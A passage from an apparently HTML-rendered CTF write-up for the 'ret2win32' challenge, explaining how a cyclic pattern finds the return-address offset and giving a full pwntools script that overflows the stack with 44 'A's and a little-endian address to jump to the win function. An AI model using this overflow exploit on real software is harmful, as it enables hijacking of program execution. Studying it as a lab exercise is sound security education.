+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;</span>
+</code></pre></div><p>If we copy the pattern, we&rsquo;ll be able to see where exactly the return addr is at.
+We follow the same process from before, and ni each step through starting from pwn+98. At return we&rsquo;ll see:
+&lt;0x6161616c&gt;
+The 616161 is a, and the 6c is an l.</p>
+<p>Great so that means we add
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa, characters and can put in our address to return to. A few things to note about the address is, that:</p>
+<ol>
+<li>The address will need to be passed in little-endian formatting</li>
+<li>The address can be any address you see in gdb, that is in the .text segment, as these addresses are static</li>
+</ol>
+<p>The smart thing about Return-Oriented-Programming, is exactly that one doesn&rsquo;t have to worry about security measures
+such as ASLR, because you return to already written code that has a static address.</p>
+<p><strong>Conclusion: You should now have a lot of knowledge important for the further challenges. We used a &ldquo;shit ton&rdquo; of useless characters to overwrite the stack till our return address, at our return address we put an adress we want to return to. We convert the address, since the program is using little endian.</strong></p>
+<p>Exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./ret2win32&#34;</span> <span style="color:#75715e">#Path to binary</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+gdbscript<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">continue
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>] <span style="color:#75715e">#Ubuntu terminal=gnome-terminal</span>
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+
+ret2win<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x804862c</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point<span style="color:#f92672">+</span>ret2win)) <span style="color:#75715e">#Sends 44 A&#39;s, and then the address to the ret2win function</span>
+    io<span style="color:#f92672">.</span>interactive() <span style="color:#75715e">#Interactive state</span>
+
+main()
+</code></pre></div>
+</article>
+
+
+
+</html>
